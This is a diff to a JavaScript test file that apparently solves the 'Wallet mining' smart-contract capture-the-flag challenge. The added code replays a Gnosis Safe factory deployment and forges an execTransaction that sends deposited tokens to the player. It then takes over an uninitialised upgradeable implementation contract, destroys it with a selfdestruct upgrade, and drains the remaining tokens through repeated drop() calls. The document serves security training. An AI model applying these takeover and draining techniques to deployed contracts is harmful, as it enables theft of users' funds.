@@ -74,9 +74,6 @@ describe('[Challenge] Wallet mining', function () {
         const attackWalletDeployer = walletDeployer.connect(player);
         const attackAuthorizer = authorizer.connect(player);
 
-        // const fn = attackAuthorizer.interface.getSighash("can(address,address)");
-        // console.log(fn);
-
         // Transfer funds to deploying address
         const tx = {
             to: data.REPLAY_DEPLOY_ADDRESS,
@@ -103,6 +100,7 @@ describe('[Challenge] Wallet mining', function () {
         const factoryContractAddr = deployFactoryTx.contractAddress;
         console.log("Replayed deploy safe factory at", factoryContractAddr);
 
+        // Connect to proxy factory
         const proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", factoryContractAddr, player);
 
         // Helper function to create ABIs
@@ -149,6 +147,8 @@ describe('[Challenge] Wallet mining', function () {
         const tokenABI = ["function transfer(address to, uint256 amount)"];
         const tokenABIData = createInterface(tokenABI, "transfer", [player.address, DEPOSIT_TOKEN_AMOUNT]);
 
+        // Create an execTransaction that transfers all tokens back to the player
+        
         // 1. need to get transaction hash from here https://github.com/safe-global/safe-contracts/blob/v1.1.1/contracts/GnosisSafe.sol#L398
         // 2. sign transaction hash
         // 3. Add 4 to v as per gnosis spec to show it is an eth_sign tx https://docs.gnosis-safe.io/learn/safe-tools/signatures
@@ -157,7 +157,7 @@ describe('[Challenge] Wallet mining', function () {
         const depositAddrSafe = await ethers.getContractAt("GnosisSafe", DEPOSIT_ADDRESS, player);
 
         // Test that we are connected
-        console.log(await depositAddrSafe.VERSION());
+        console.log("Version:", await depositAddrSafe.VERSION());
         
         // Params for the execTransaction
         const transactionParams = [
@@ -173,21 +173,53 @@ describe('[Challenge] Wallet mining', function () {
             0
         ];
 
-        // Get hash from contract
+        // Get tx hash from generated from the contract
         const txhash = await depositAddrSafe.getTransactionHash(...transactionParams);
         const signed = await player.signMessage(ethers.utils.arrayify(txhash));
 
         // Increase v by 4
         const signedIncreaseV = ethers.BigNumber.from(signed).add(4).toHexString();
 
+        // Remove nonce from params and pass in params as well as signed hash
         await depositAddrSafe.execTransaction(...(transactionParams.slice(0, -1)), signedIncreaseV);
-        
-        const bal = await token.balanceOf(player.address);
-        console.log("Player balance = ", ethers.utils.formatEther(bal))
 
-        // await attackAuthorizer.upgradeToAndCall(player.address, "0x");
-        console.log(attackAuthorizer.address);
-        console.log(await attackWalletDeployer.mom());
+        let bal = await token.balanceOf(player.address);
+        console.log("Player balance = ", ethers.utils.formatEther(bal))
+        // Part 1 of the exploit is complete!
+
+        // Part 2: Bricking the implementation contract
+
+        // Get the implementation address and initialise it
+        // Implementation slot address is from EIP-1967 https://eips.ethereum.org/EIPS/eip-1967
+        const impSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
+        let implementationAddress = "0x" + (await ethers.provider.getStorageAt(attackAuthorizer.address, impSlot)).slice(-40);
+        const impContract = await ethers.getContractAt("AuthorizerUpgradeable", implementationAddress, player);
+
+        // Deploy attacking contract that has selfdestruct
+        const attackContractFactory = await ethers.getContractFactory("AttackWalletMining", player);
+        const attackContract = await attackContractFactory.deploy();
+
+        // Create ABI to delegate call attacking contract
+        const attackABI = ["function test()"];
+        const IAttack = createInterface(attackABI, "test", []);
+
+        // Init implementation contract to claim ownership of the contract
+        // Upgrade to and call attacking contract, calling selfdestruct
+        await impContract.init([], []);
+        await impContract.upgradeToAndCall(attackContract.address, IAttack);
+
+        await attackContract.printValues(attackAuthorizer.address, player.address, DEPOSIT_ADDRESS);
+
+        // Deploy 43 Wallets through wallet deployer to retrieve all 
+        // tokens in the contract
+        for (let i = 0; i < 43; i ++) {
+            await attackWalletDeployer.drop(setupDummyABIData);
+        }
+
+        bal = await token.balanceOf(player.address);
+        console.log("Player balance = ", ethers.utils.formatEther(bal))
+        // Part 2 complete!
+
     });
 
     after(async function () {
